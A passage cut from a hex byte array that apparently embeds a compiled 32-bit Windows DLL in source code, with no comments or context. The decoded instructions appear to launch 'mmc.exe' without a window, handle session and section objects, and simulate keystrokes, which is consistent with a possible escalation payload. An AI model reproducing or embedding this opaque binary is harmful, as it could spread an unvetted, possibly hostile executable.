	0xC1, 0xC3, 0x55, 0x8B, 0xEC, 0x57, 0xBF, 0x04, 0x01, 0x00, 0x00, 0x85, 0xC9, 0x74, 0x3B, 0x8B,
	0x55, 0x08, 0x85, 0xD2, 0x74, 0x34, 0x0F, 0xB7, 0x02, 0x53, 0x8B, 0xD8, 0x56, 0x8B, 0xF1, 0x66,
	0x85, 0xC0, 0x74, 0x1F, 0x2B, 0xD1, 0x8D, 0x47, 0xFF, 0x85, 0xC0, 0x74, 0x16, 0x85, 0xFF, 0x74,
	0x12, 0x66, 0x89, 0x1E, 0x83, 0xC6, 0x02, 0x4F, 0x0F, 0xB7, 0x04, 0x32, 0x8B, 0xD8, 0x66, 0x85,
	0xC0, 0x75, 0xE3, 0x33, 0xC0, 0x66, 0x89, 0x06, 0x5E, 0x5B, 0x8B, 0xC1, 0x5F, 0x5D, 0xC3, 0xC2,
	0x00, 0x00, 0x55, 0x8B, 0xEC, 0x83, 0xE4, 0xF8, 0x51, 0x53, 0x56, 0xB9, 0x40, 0x80, 0x00, 0x10,
	0xBA, 0x34, 0x08, 0x00, 0x00, 0x57, 0x8B, 0xC1, 0x33, 0xDB, 0x88, 0x18, 0x40, 0x83, 0xEA, 0x01,
	0x75, 0xF8, 0xE8, 0x63, 0xF1, 0xFF, 0xFF, 0x8B, 0xF8, 0x85, 0xFF, 0x74, 0x10, 0xBB, 0x4C, 0x80,
	0x00, 0x10, 0x8B, 0xCB, 0xE8, 0x5F, 0xFF, 0xFF, 0xFF, 0x03, 0xC0, 0xEB, 0x02, 0x8B, 0xC3, 0x8B,
	0xD0, 0x8B, 0xCB, 0xE8, 0xC5, 0xF3, 0xFF, 0xFF, 0xF7, 0xD8, 0x1B, 0xF6, 0xF7, 0xDE, 0x85, 0xFF,
	0x74, 0x0A, 0xB9, 0x6A, 0x86, 0x00, 0x10, 0xE8, 0x72, 0xF2, 0xFF, 0xFF, 0x56, 0xFF, 0x15, 0x58,
	0x40, 0x00, 0x10, 0xCC, 0x55, 0x8B, 0xEC, 0xFF, 0x75, 0x10, 0xFF, 0x75, 0x0C, 0xFF, 0x75, 0x08,
	0x6A, 0x00, 0xFF, 0x15, 0xC4, 0x40, 0x00, 0x10, 0x5D, 0xC2, 0x0C, 0x00, 0x55, 0x8B, 0xEC, 0x81,
	0xEC, 0x10, 0x02, 0x00, 0x00, 0x53, 0x57, 0x8B, 0xF9, 0xC7, 0x45, 0xFC, 0x01, 0x00, 0x00, 0x00,
	0xBA, 0x0A, 0x02, 0x00, 0x00, 0x8D, 0x85, 0xF0, 0xFD, 0xFF, 0xFF, 0x33, 0xDB, 0x88, 0x18, 0x40,
	0x83, 0xEA, 0x01, 0x75, 0xF8, 0x68, 0x04, 0x01, 0x00, 0x00, 0x8D, 0x85, 0xF0, 0xFD, 0xFF, 0xFF,
	0x50, 0x53, 0xFF, 0x15, 0x64, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x74, 0x6F, 0x56, 0x8D, 0x8D, 0xF0,
	0xFD, 0xFF, 0xFF, 0xE8, 0xB8, 0xFD, 0xFF, 0xFF, 0x8B, 0xF0, 0x85, 0xF6, 0x74, 0x5C, 0xBA, 0xC0,
	0x42, 0x00, 0x10, 0x8B, 0xCE, 0xE8, 0x10, 0xFE, 0xFF, 0xFF, 0x85, 0xC0, 0x75, 0x3A, 0x68, 0xD0,
	0x42, 0x00, 0x10, 0x57, 0xFF, 0x15, 0x3C, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x74, 0x23, 0x53, 0x57,
	0x50, 0x6A, 0x04, 0xFF, 0x15, 0xD0, 0x40, 0x00, 0x10, 0x8B, 0xF0, 0x85, 0xF6, 0x74, 0x12, 0x68,
	0x98, 0x3A, 0x00, 0x00, 0xFF, 0x15, 0x50, 0x40, 0x00, 0x10, 0x56, 0xFF, 0x15, 0xCC, 0x40, 0x00,
	0x10, 0x53, 0xFF, 0x15, 0x58, 0x40, 0x00, 0x10, 0x8B, 0x55, 0x08, 0x85, 0xD2, 0x74, 0x10, 0x8B,
	0xCE, 0xE8, 0xC4, 0xFD, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0x17, 0x5E, 0x5F, 0x5B, 0xC9, 0xC3, 0x8D,
	0x55, 0xFC, 0xE8, 0x25, 0xF7, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0xEF, 0x83, 0x7D, 0xFC, 0x02, 0x75,
	0xE9, 0xE8, 0xBC, 0xFE, 0xFF, 0xFF, 0xCC, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x10, 0x6A, 0x6D, 0x58,
	0x6A, 0x63, 0x66, 0x89, 0x45, 0xF0, 0x66, 0x89, 0x45, 0xF2, 0x58, 0x6A, 0x2E, 0x66, 0x89, 0x45,
	0xF4, 0x58, 0x6A, 0x65, 0x59, 0x66, 0x89, 0x45, 0xF6, 0x6A, 0x78, 0x58, 0x66, 0x89, 0x45, 0xFA,
	0x33, 0xC0, 0x83, 0x7D, 0x0C, 0x01, 0x66, 0x89, 0x4D, 0xF8, 0x66, 0x89, 0x4D, 0xFC, 0x66, 0x89,
	0x45, 0xFE, 0x75, 0x0D, 0x8D, 0x4D, 0xF0, 0x51, 0x8B, 0x4D, 0x08, 0xE8, 0xEC, 0xFE, 0xFF, 0xFF,
	0x59, 0x33, 0xC0, 0x40, 0xC9, 0xC2, 0x0C, 0x00, 0x55, 0x8B, 0xEC, 0x33, 0xC0, 0x40, 0x39, 0x45,
	0x0C, 0x74, 0x04, 0x5D, 0xC2, 0x0C, 0x00, 0xE8, 0x56, 0xFE, 0xFF, 0xFF, 0xCC, 0xE9, 0x50, 0xFE,
	0xFF, 0xFF, 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x14, 0x04, 0x00, 0x00, 0x8D, 0x45, 0xFC, 0xC7, 0x45,
	0xFC, 0x00, 0x00, 0x00, 0x00, 0x50, 0x51, 0x8D, 0x85, 0xEC, 0xFB, 0xFF, 0xFF, 0x50, 0xFF, 0x15,
	0x70, 0x40, 0x00, 0x10, 0x8B, 0xC8, 0xE8, 0xF5, 0xEB, 0xFF, 0xFF, 0x83, 0xC4, 0x0C, 0x85, 0xC0,
	0x74, 0x11, 0x83, 0x7D, 0xFC, 0x00, 0x76, 0x0B, 0x8D, 0x8D, 0xEC, 0xFB, 0xFF, 0xFF, 0xE8, 0x3C,
	0x09, 0x00, 0x00, 0x6A, 0x00, 0xFF, 0x15, 0x58, 0x40, 0x00, 0x10, 0xCC, 0xE8, 0x1B, 0x0A, 0x00,
	0x00, 0x6A, 0x00, 0xFF, 0x15, 0x58, 0x40, 0x00, 0x10, 0xCC, 0x55, 0x8B, 0xEC, 0x83, 0xE4, 0xF8,
	0x83, 0x7D, 0x0C, 0x01, 0x53, 0x56, 0x75, 0x59, 0xFF, 0x75, 0x08, 0xFF, 0x15, 0x54, 0x40, 0x00,
	0x10, 0xB9, 0x40, 0x80, 0x00, 0x10, 0xBA, 0x34, 0x08, 0x00, 0x00, 0x8B, 0xC1, 0x33, 0xDB, 0x88,
	0x18, 0x40, 0x83, 0xEA, 0x01, 0x75, 0xF8, 0xE8, 0x4E, 0xEF, 0xFF, 0xFF, 0x8B, 0xF0, 0x85, 0xF6,
	0x74, 0x10, 0xBB, 0x4C, 0x80, 0x00, 0x10, 0x8B, 0xCB, 0xE8, 0x4A, 0xFD, 0xFF, 0xFF, 0x03, 0xC0,
	0xEB, 0x02, 0x8B, 0xC3, 0x8B, 0x0D, 0x44, 0x40, 0x00, 0x10, 0x8B, 0xD3, 0x50, 0xE8, 0x1C, 0xF3,
	0xFF, 0xFF, 0x59, 0x85, 0xF6, 0x74, 0x0A, 0xB9, 0x6A, 0x86, 0x00, 0x10, 0xE8, 0x5D, 0xF0, 0xFF,
	0xFF, 0x33, 0xC0, 0x5E, 0x40, 0x5B, 0x8B, 0xE5, 0x5D, 0xC2, 0x0C, 0x00, 0x55, 0x8B, 0xEC, 0x83,
	0xE4, 0xF8, 0x83, 0x7D, 0x0C, 0x01, 0x53, 0x56, 0x75, 0x5F, 0x33, 0xDB, 0x53, 0x68, 0xBB, 0x1C,
	0x00, 0x10, 0xFF, 0x15, 0xC0, 0x40, 0x00, 0x10, 0xFF, 0x75, 0x08, 0xFF, 0x15, 0xE4, 0x40, 0x00,
	0x10, 0xB9, 0x40, 0x80, 0x00, 0x10, 0xBA, 0x34, 0x08, 0x00, 0x00, 0x8B, 0xC1, 0x88, 0x18, 0x40,
	0x83, 0xEA, 0x01, 0x75, 0xF8, 0xE8, 0xD0, 0xEE, 0xFF, 0xFF, 0x8B, 0xF0, 0x85, 0xF6, 0x74, 0x10,
	0xBB, 0x4C, 0x80, 0x00, 0x10, 0x8B, 0xCB, 0xE8, 0xCC, 0xFC, 0xFF, 0xFF, 0x03, 0xC0, 0xEB, 0x02,
	0x8B, 0xC3, 0x8B, 0xD0, 0x8B, 0xCB, 0xE8, 0x1B, 0xF4, 0xFF, 0xFF, 0x85, 0xF6, 0x74, 0x0A, 0xB9,
	0x6A, 0x86, 0x00, 0x10, 0xE8, 0xE5, 0xEF, 0xFF, 0xFF, 0x33, 0xC0, 0x5E, 0x40, 0x5B, 0x8B, 0xE5,
	0x5D, 0xC2, 0x0C, 0x00, 0x33, 0xC0, 0x40, 0xC3, 0x33, 0xC0, 0xC2, 0x08, 0x00, 0x55, 0x8B, 0xEC,
	0x83, 0xEC, 0x28, 0x53, 0x56, 0x8B, 0x35, 0x84, 0x40, 0x00, 0x10, 0x33, 0xDB, 0x57, 0x68, 0x00,
	0x43, 0x00, 0x10, 0x89, 0x5D, 0xF0, 0x89, 0x5D, 0xEC, 0x89, 0x5D, 0xF4, 0xFF, 0xD6, 0x89, 0x45,
	0xF8, 0x85, 0xC0, 0x0F, 0x84, 0xEB, 0x00, 0x00, 0x00, 0x68, 0xE0, 0x42, 0x00, 0x10, 0xFF, 0xD6,
	0x89, 0x45, 0xFC, 0x85, 0xC0, 0x0F, 0x84, 0xC4, 0x00, 0x00, 0x00, 0x8D, 0x45, 0xF0, 0x50, 0x68,
	0x60, 0x41, 0x00, 0x10, 0x6A, 0x01, 0x53, 0x68, 0x70, 0x41, 0x00, 0x10, 0xFF, 0x15, 0x54, 0x41,
	0x00, 0x10, 0x85, 0xC0, 0x0F, 0x88, 0xA0, 0x00, 0x00, 0x00, 0x8D, 0x45, 0xD8, 0x50, 0xFF, 0x15,
	0x7C, 0x40, 0x00, 0x10, 0x83, 0xEC, 0x10, 0x8B, 0x45, 0xF0, 0x8B, 0xFC, 0x8D, 0x75, 0xD8, 0x83,
	0xEC, 0x10, 0x8B, 0x08, 0xA5, 0xA5, 0xA5, 0xA5, 0x8B, 0xFC, 0x8D, 0x75, 0xD8, 0x83, 0xEC, 0x10,
	0xA5, 0xA5, 0xA5, 0xA5, 0x8B, 0xFC, 0x8D, 0x75, 0xD8, 0x83, 0xEC, 0x10, 0xA5, 0xA5, 0xA5, 0xA5,
	0x8B, 0xFC, 0x8D, 0x75, 0xD8, 0x50, 0xA5, 0xA5, 0xA5, 0xA5, 0xFF, 0x51, 0x28, 0x8B, 0x7D, 0xF8,
	0x85, 0xC0, 0x78, 0x51, 0x8B, 0x45, 0xF0, 0x8D, 0x55, 0xEC, 0x52, 0x57, 0x50, 0x8B, 0x08, 0xFF,
	0x51, 0x1C, 0x8B, 0x75, 0xFC, 0x85, 0xC0, 0x78, 0x4B, 0x8B, 0x45, 0xEC, 0x8D, 0x55, 0xF4, 0x52,
	0x56, 0x50, 0x8B, 0x08, 0xFF, 0x51, 0x34, 0x85, 0xC0, 0x78, 0x39, 0x8B, 0x45, 0xF4, 0x8D, 0x55,
	0xE8, 0x52, 0x50, 0x8B, 0x08, 0xFF, 0x51, 0x24, 0x85, 0xC0, 0x78, 0x28, 0x83, 0x7D, 0xE8, 0x04,
	0x75, 0x0A, 0x8B, 0x45, 0xF4, 0x53, 0x50, 0x8B, 0x08, 0xFF, 0x51, 0x5C, 0x8B, 0xD8, 0xF7, 0xD3,
	0xC1, 0xEB, 0x1F, 0xEB, 0x0F, 0x8B, 0x75, 0xFC, 0xEB, 0x0A, 0x8B, 0x75, 0xFC, 0xEB, 0x02, 0x8B,
	0xF0, 0x8B, 0x7D, 0xF8, 0x57, 0x8B, 0x3D, 0x80, 0x40, 0x00, 0x10, 0xFF, 0xD7, 0x85, 0xF6, 0x74,
	0x03, 0x56, 0xFF, 0xD7, 0x8B, 0x4D, 0xF4, 0x85, 0xC9, 0x74, 0x06, 0x8B, 0x01, 0x51, 0xFF, 0x50,
	0x08, 0x8B, 0x4D, 0xEC, 0x85, 0xC9, 0x74, 0x06, 0x8B, 0x01, 0x51, 0xFF, 0x50, 0x08, 0x8B, 0x55,
	0xF0, 0x85, 0xD2, 0x74, 0x06, 0x8B, 0x0A, 0x52, 0xFF, 0x51, 0x08, 0x5F, 0x5E, 0x8B, 0xC3, 0x5B,
	0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x50, 0xB8, 0x58, 0x43, 0x00, 0x10, 0xC7, 0x45, 0xF0,
	0x71, 0x4E, 0xF5, 0xEE, 0x89, 0x45, 0xB0, 0x33, 0xD2, 0x89, 0x45, 0xC0, 0x0F, 0x57, 0xC0, 0x6A,
	0x04, 0x59, 0x33, 0xC0, 0xC7, 0x45, 0xF4, 0x61, 0x06, 0x2D, 0x42, 0x66, 0x89, 0x45, 0xE6, 0x8D,
	0x45, 0xB0, 0x50, 0x6A, 0x03, 0x8D, 0x45, 0xE0, 0xC7, 0x45, 0xF8, 0x9A, 0x98, 0x82, 0xFD, 0x50,
	0x8D, 0x45, 0xF0, 0xC7, 0x45, 0xFC, 0x49, 0x40, 0xB8, 0x20, 0x50, 0x89, 0x55, 0xB4, 0x89, 0x4D,
	0xB8, 0x89, 0x55, 0xBC, 0x89, 0x55, 0xC4, 0x89, 0x4D, 0xC8, 0x89, 0x55, 0xCC, 0x66, 0x0F, 0x13,
	0x45, 0xD0, 0x89, 0x55, 0xD8, 0x89, 0x55, 0xDC, 0xC7, 0x45, 0xE0, 0x46, 0x1F, 0x00, 0x11, 0x88,
	0x4D, 0xE4, 0x88, 0x55, 0xE5, 0xC7, 0x45, 0xE8, 0x00, 0x01, 0x00, 0x00, 0xC7, 0x45, 0xEC, 0x00,
	0x00, 0x00, 0x40, 0xFF, 0x15, 0xE0, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x75, 0x1D, 0xB8, 0x48, 0x1F,
	0x00, 0x00, 0x66, 0x89, 0x45, 0xE0, 0x8D, 0x45, 0xB0, 0x50, 0x6A, 0x03, 0x8D, 0x45, 0xE0, 0x50,
	0x8D, 0x45, 0xF0, 0x50, 0xFF, 0x15, 0xE0, 0x40, 0x00, 0x10, 0xC9, 0xC3, 0x56, 0x6A, 0x0E, 0x6A,
	0x00, 0xBE, 0x01, 0x00, 0x00, 0xC0, 0xFF, 0x15, 0x50, 0x41, 0x00, 0x10, 0x85, 0xC0, 0x78, 0x20,
	0xB9, 0xE8, 0x03, 0x00, 0x00, 0xE8, 0x3B, 0xEE, 0xFF, 0xFF, 0xE8, 0xEE, 0xFD, 0xFF, 0xFF, 0xF7,
	0xD8, 0x1B, 0xC0, 0x25, 0xFF, 0xFF, 0xFF, 0x3F, 0x03, 0xF0, 0xFF, 0x15, 0x58, 0x41, 0x00, 0x10,
	0x8B, 0xC6, 0x5E, 0xC3, 0xB9, 0xD0, 0x07, 0x00, 0x00, 0xE8, 0x17, 0xEE, 0xFF, 0xFF, 0x33, 0xC0,
	0xC3, 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x10, 0x02, 0x00, 0x00, 0x53, 0x33, 0xDB, 0x89, 0x5D, 0xFC,
	0xFF, 0x15, 0x70, 0x40, 0x00, 0x10, 0x8B, 0xD0, 0xB9, 0x0A, 0x02, 0x00, 0x00, 0x8D, 0x85, 0xF0,
	0xFD, 0xFF, 0xFF, 0x88, 0x18, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0x8D, 0x45, 0xFC, 0x50, 0x51,
	0x8D, 0x85, 0xF0, 0xFD, 0xFF, 0xFF, 0x8B, 0xCA, 0x50, 0xE8, 0x62, 0xE8, 0xFF, 0xFF, 0x83, 0xC4,
	0x0C, 0x39, 0x5D, 0xFC, 0x74, 0x33, 0x66, 0x83, 0xBD, 0xF0, 0xFD, 0xFF, 0xFF, 0x31, 0x75, 0x07,
	0xE8, 0xBD, 0xFE, 0xFF, 0xFF, 0xEB, 0x20, 0x66, 0x83, 0xBD, 0xF0, 0xFD, 0xFF, 0xFF, 0x32, 0x75,
	0x07, 0xE8, 0x56, 0xFF, 0xFF, 0xFF, 0xEB, 0x0F, 0x66, 0x83, 0xBD, 0xF0, 0xFD, 0xFF, 0xFF, 0x33,
	0x75, 0x07, 0xE8, 0x7D, 0xFF, 0xFF, 0xFF, 0x8B, 0xD8, 0x53, 0xFF, 0x15, 0x58, 0x40, 0x00, 0x10,
	0xCC, 0x55, 0x8B, 0xEC, 0x83, 0xE4, 0xF8, 0x81, 0xEC, 0xBC, 0x05, 0x00, 0x00, 0x53, 0x33, 0xDB,
	0xC7, 0x44, 0x24, 0x14, 0x00, 0x10, 0x00, 0x00, 0x83, 0x7D, 0x0C, 0x01, 0x56, 0x57, 0x89, 0x5C,
	0x24, 0x18, 0x89, 0x5C, 0x24, 0x10, 0x89, 0x5C, 0x24, 0x14, 0x0F, 0x85, 0x13, 0x03, 0x00, 0x00,
	0xFF, 0x75, 0x08, 0xFF, 0x15, 0x54, 0x40, 0x00, 0x10, 0xBE, 0x00, 0x01, 0x00, 0x00, 0x8D, 0x84,
	0x24, 0xB0, 0x00, 0x00, 0x00, 0x8B, 0xCE, 0x88, 0x18, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0x8D,
	0x94, 0x24, 0xB0, 0x00, 0x00, 0x00, 0xB9, 0x66, 0x30, 0x00, 0x00, 0xE8, 0x19, 0xEA, 0xFF, 0xFF,
	0xBA, 0x2C, 0x43, 0x00, 0x10, 0x8D, 0x8C, 0x24, 0xB0, 0x01, 0x00, 0x00, 0xE8, 0x46, 0xF9, 0xFF,
	0xFF, 0x8B, 0xD1, 0x66, 0x39, 0x9C, 0x24, 0xB0, 0x01, 0x00, 0x00, 0x74, 0x08, 0x83, 0xC2, 0x02,
	0x66, 0x39, 0x1A, 0x75, 0xF8, 0x64, 0xA1, 0x18, 0x00, 0x00, 0x00, 0x8B, 0x48, 0x30, 0x8B, 0x89,
	0xD4, 0x01, 0x00, 0x00, 0xE8, 0x6F, 0xE8, 0xFF, 0xFF, 0xBA, 0x80, 0x41, 0x00, 0x10, 0x8D, 0x8C,
	0x24, 0xB0, 0x01, 0x00, 0x00, 0xE8, 0x5B, 0xF8, 0xFF, 0xFF, 0x8D, 0x94, 0x24, 0xB0, 0x00, 0x00,
	0x00, 0x8D, 0x8C, 0x24, 0xB0, 0x01, 0x00, 0x00, 0xE8, 0x48, 0xF8, 0xFF, 0xFF, 0x8B, 0x3D, 0x14,
	0x41, 0x00, 0x10, 0x8D, 0x84, 0x24, 0xB0, 0x01, 0x00, 0x00, 0x50, 0x8D, 0x44, 0x24, 0x44, 0x50,
	0xFF, 0xD7, 0x8D, 0x44, 0x24, 0x40, 0xC7, 0x44, 0x24, 0x24, 0x18, 0x00, 0x00, 0x00, 0x89, 0x44,
	0x24, 0x2C, 0x8D, 0x44, 0x24, 0x24, 0x50, 0x68, 0x1F, 0x00, 0x0F, 0x00, 0x8D, 0x44, 0x24, 0x20,
	0x89, 0x5C, 0x24, 0x30, 0x50, 0xC7, 0x44, 0x24, 0x3C, 0x40, 0x00, 0x00, 0x00, 0x89, 0x5C, 0x24,
	0x40, 0x89, 0x5C, 0x24, 0x44, 0xFF, 0x15, 0x48, 0x41, 0x00, 0x10, 0x85, 0xC0, 0x0F, 0x88, 0x30,
	0x02, 0x00, 0x00, 0x6A, 0x04, 0x68, 0x00, 0x00, 0x10, 0x00, 0x6A, 0x02, 0x8D, 0x44, 0x24, 0x28,
	0x50, 0x53, 0x68, 0x00, 0x10, 0x00, 0x00, 0x53, 0x8D, 0x44, 0x24, 0x2C, 0x50, 0x6A, 0xFF, 0xFF,
	0x74, 0x24, 0x3C, 0xFF, 0x15, 0xE8, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x0F, 0x88, 0xF8, 0x01, 0x00,
	0x00, 0x8B, 0x54, 0x24, 0x10, 0x85, 0xD2, 0x0F, 0x84, 0xEC, 0x01, 0x00, 0x00, 0x81, 0x7C, 0x24,
	0x1C, 0x10, 0x02, 0x00, 0x00, 0x0F, 0x82, 0xDE, 0x01, 0x00, 0x00, 0xB9, 0x0A, 0x02, 0x00, 0x00,
	0x8D, 0x84, 0x24, 0xB8, 0x03, 0x00, 0x00, 0x88, 0x18, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8, 0x51,
	0x8D, 0x42, 0x04, 0x50, 0x8D, 0x8C, 0x24, 0xC0, 0x03, 0x00, 0x00, 0xE8, 0x82, 0xF8, 0xFF, 0xFF,
	0x83, 0xC4, 0x08, 0x8D, 0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x88, 0x18, 0x40, 0x83, 0xEE, 0x01,
	0x75, 0xF8, 0xBA, 0x80, 0x41, 0x00, 0x10, 0x8D, 0x8C, 0x24, 0xB0, 0x01, 0x00, 0x00, 0xE8, 0x14,
	0xF8, 0xFF, 0xFF, 0x8D, 0x94, 0x24, 0xB0, 0x00, 0x00, 0x00, 0xB9, 0x66, 0x31, 0x00, 0x00, 0xE8,
	0xC5, 0xE8, 0xFF, 0xFF, 0x8D, 0x94, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x8D, 0x8C, 0x24, 0xB0, 0x01,
	0x00, 0x00, 0xE8, 0x3E, 0xF7, 0xFF, 0xFF, 0x8D, 0x84, 0x24, 0xB0, 0x01, 0x00, 0x00, 0x50, 0x8D,
	0x44, 0x24, 0x44, 0x50, 0xFF, 0xD7, 0x8D, 0x44, 0x24, 0x40, 0xC7, 0x44, 0x24, 0x24, 0x18, 0x00,
	0x00, 0x00, 0x89, 0x44, 0x24, 0x2C, 0x8D, 0x44, 0x24, 0x24, 0x50, 0x6A, 0x02, 0x8D, 0x44, 0x24,
	0x1C, 0x89, 0x5C, 0x24, 0x30, 0x50, 0xC7, 0x44, 0x24, 0x3C, 0x40, 0x00, 0x00, 0x00, 0x89, 0x5C,
	0x24, 0x40, 0x89, 0x5C, 0x24, 0x44, 0xFF, 0x15, 0x04, 0x41, 0x00, 0x10, 0x85, 0xC0, 0x0F, 0x88,
	0x19, 0x01, 0x00, 0x00, 0xB9, 0x40, 0x80, 0x00, 0x10, 0xBA, 0x34, 0x08, 0x00, 0x00, 0x8B, 0xC1,
	0x88, 0x18, 0x40, 0x83, 0xEA, 0x01, 0x75, 0xF8, 0xE8, 0xAD, 0xE9, 0xFF, 0xFF, 0x89, 0x44, 0x24,
	0x3C, 0x85, 0xC0, 0x74, 0x12, 0xBF, 0x4C, 0x80, 0x00, 0x10, 0x8B, 0xCF, 0xE8, 0xA7, 0xF7, 0xFF,
	0xFF, 0x8B, 0xF0, 0x03, 0xF6, 0xEB, 0x04, 0x8B, 0xFB, 0x8B, 0xF3, 0x8B, 0x1D, 0x24, 0x41, 0x00,
	0x10, 0x8D, 0x44, 0x24, 0x50, 0x68, 0x44, 0x43, 0x00, 0x10, 0x50, 0xFF, 0xD3, 0x85, 0xC0, 0x78,
	0x25, 0x68, 0x30, 0x00, 0xFE, 0x7F, 0x8D, 0x44, 0x24, 0x4C, 0x50, 0xFF, 0xD3, 0x33, 0xDB, 0x85,
	0xC0, 0x78, 0x15, 0x8D, 0x44, 0x24, 0x48, 0x50, 0x8D, 0x44, 0x24, 0x54, 0x50, 0x53, 0xFF, 0x15,
	0x2C, 0x41, 0x00, 0x10, 0xEB, 0x02, 0x33, 0xDB, 0x8B, 0xD6, 0x8B, 0xCF, 0xE8, 0xCC, 0xEB, 0xFF,
	0xFF, 0x85, 0xC0, 0x74, 0x0A, 0x8B, 0x44, 0x24, 0x10, 0xC7, 0x00, 0x01, 0x00, 0x00, 0x00, 0x6A,
	0x44, 0x5A, 0x8B, 0xCA, 0x8D, 0x44, 0x24, 0x68, 0x88, 0x18, 0x40, 0x83, 0xE9, 0x01, 0x75, 0xF8,
	0x6A, 0x32, 0x58, 0x66, 0x89, 0x44, 0x24, 0x20, 0x33, 0xC0, 0x66, 0x89, 0x44, 0x24, 0x22, 0x8D,
	0x44, 0x24, 0x58, 0x50, 0x8D, 0x44, 0x24, 0x6C, 0x89, 0x54, 0x24, 0x6C, 0x50, 0x53, 0x53, 0x68,
	0x00, 0x00, 0x00, 0x08, 0x53, 0x53, 0x53, 0x8D, 0x44, 0x24, 0x40, 0x50, 0x8D, 0x84, 0x24, 0xDC,
	0x03, 0x00, 0x00, 0x50, 0xFF, 0x15, 0x44, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x74, 0x19, 0xFF, 0x74,
	0x24, 0x5C, 0x8B, 0x35, 0x2C, 0x40, 0x00, 0x10, 0xFF, 0xD6, 0xFF, 0x74, 0x24, 0x58, 0xFF, 0xD6,
	0x8B, 0x44, 0x24, 0x10, 0x83, 0x08, 0x02, 0x53, 0xFF, 0x74, 0x24, 0x18, 0xFF, 0x15, 0x34, 0x41,
	0x00, 0x10, 0xFF, 0x74, 0x24, 0x14, 0xFF, 0x15, 0x20, 0x41, 0x00, 0x10, 0x83, 0x7C, 0x24, 0x3C,
	0x00, 0x74, 0x0A, 0xB9, 0x6A, 0x86, 0x00, 0x10, 0xE8, 0xF1, 0xE9, 0xFF, 0xFF, 0xFF, 0x74, 0x24,
	0x10, 0x6A, 0xFF, 0xFF, 0x15, 0x3C, 0x41, 0x00, 0x10, 0xFF, 0x74, 0x24, 0x18, 0xFF, 0x15, 0x20,
	0x41, 0x00, 0x10, 0x5F, 0x33, 0xC0, 0x5E, 0x40, 0x5B, 0x8B, 0xE5, 0x5D, 0xC2, 0x0C, 0x00, 0x55,
	0x8B, 0xEC, 0x83, 0xEC, 0x1C, 0x53, 0x33, 0xC0, 0xC7, 0x45, 0xE4, 0x01, 0x00, 0x00, 0x00, 0x56,
	0x8B, 0x35, 0xB0, 0x40, 0x00, 0x10, 0x66, 0x8B, 0xD9, 0x57, 0x8B, 0xFA, 0x66, 0x89, 0x45, 0xEA,
	0x89, 0x45, 0xF0, 0x89, 0x45, 0xF4, 0x89, 0x45, 0xEC, 0xB8, 0xA0, 0x00, 0x00, 0x00, 0x85, 0xFF,
	0x74, 0x0E, 0x66, 0x89, 0x45, 0xE8, 0x8D, 0x45, 0xE4, 0x6A, 0x1C, 0x50, 0x6A, 0x01, 0xFF, 0xD6,
	0x6A, 0x1C, 0x8D, 0x45, 0xE4, 0x66, 0x89, 0x5D, 0xE8, 0x50, 0x6A, 0x01, 0xFF, 0xD6, 0x6A, 0x02,
	0x5B, 0x6A, 0x1C, 0x8D, 0x45, 0xE4, 0x89, 0x5D, 0xEC, 0x50, 0x6A, 0x01, 0xFF, 0xD6, 0x85, 0xFF,
	0x74, 0x16, 0xB8, 0xA0, 0x00, 0x00, 0x00, 0x89, 0x5D, 0xEC, 0x66, 0x89, 0x45, 0xE8, 0x8D, 0x45,
	0xE4, 0x6A, 0x1C, 0x50, 0x6A, 0x01, 0xFF, 0xD6, 0x5F, 0x5E, 0x5B, 0xC9, 0xC3, 0x53, 0x56, 0x57,
	0x6A, 0x01, 0x68, 0x60, 0x43, 0x00, 0x10, 0x8B, 0xF1, 0xFF, 0x15, 0xA4, 0x40, 0x00, 0x10, 0x8B,
	0xCE, 0x8B, 0xD8, 0x33, 0xFF, 0xE8, 0xFE, 0xF5, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0x2B, 0x0F, 0xB7,
	0x04, 0x7E, 0x53, 0x50, 0xFF, 0x15, 0xD8, 0x40, 0x00, 0x10, 0x0F, 0xB7, 0xC0, 0x8B, 0xD0, 0x0F,
	0xB6, 0xC8, 0xC1, 0xEA, 0x08, 0x83, 0xE2, 0x01, 0xE8, 0x42, 0xFF, 0xFF, 0xFF, 0x8B, 0xCE, 0x47,
	0xE8, 0xD3, 0xF5, 0xFF, 0xFF, 0x3B, 0xF8, 0x72, 0xD5, 0x5F, 0x5E, 0x5B, 0xC3, 0x55, 0x8B, 0xEC,
	0x81, 0xEC, 0x10, 0x02, 0x00, 0x00, 0x56, 0x68, 0x98, 0x43, 0x00, 0x10, 0x68, 0xA4, 0x43, 0x00,
	0x10, 0x6A, 0x00, 0xFF, 0x75, 0x08, 0xFF, 0x15, 0xAC, 0x40, 0x00, 0x10, 0x85, 0xC0, 0x0F, 0x84,
	0xD5, 0x00, 0x00, 0x00, 0x6A, 0x0E, 0x5E, 0x6A, 0x28, 0x33, 0xD2, 0x59, 0xE8, 0xFE, 0xFE, 0xFF,
	0xFF, 0x83, 0xEE, 0x01, 0x75, 0xF1, 0x8B, 0x35, 0x94, 0x40, 0x00, 0x10, 0x68, 0x2E, 0x01, 0x00,
	0x00, 0xFF, 0x75, 0x08, 0xFF, 0xD6, 0x85, 0xC0, 0x75, 0x12, 0x68, 0x5D, 0x04, 0x00, 0x00, 0xFF,
	0x75, 0x08, 0xFF, 0xD6, 0x85, 0xC0, 0x0F, 0x84, 0x9D, 0x00, 0x00, 0x00, 0x6A, 0x09, 0x33, 0xD2,
	0x59, 0xE8, 0xC9, 0xFE, 0xFF, 0xFF, 0x6A, 0x09, 0x33, 0xD2, 0x59, 0xE8, 0xBF, 0xFE, 0xFF, 0xFF,
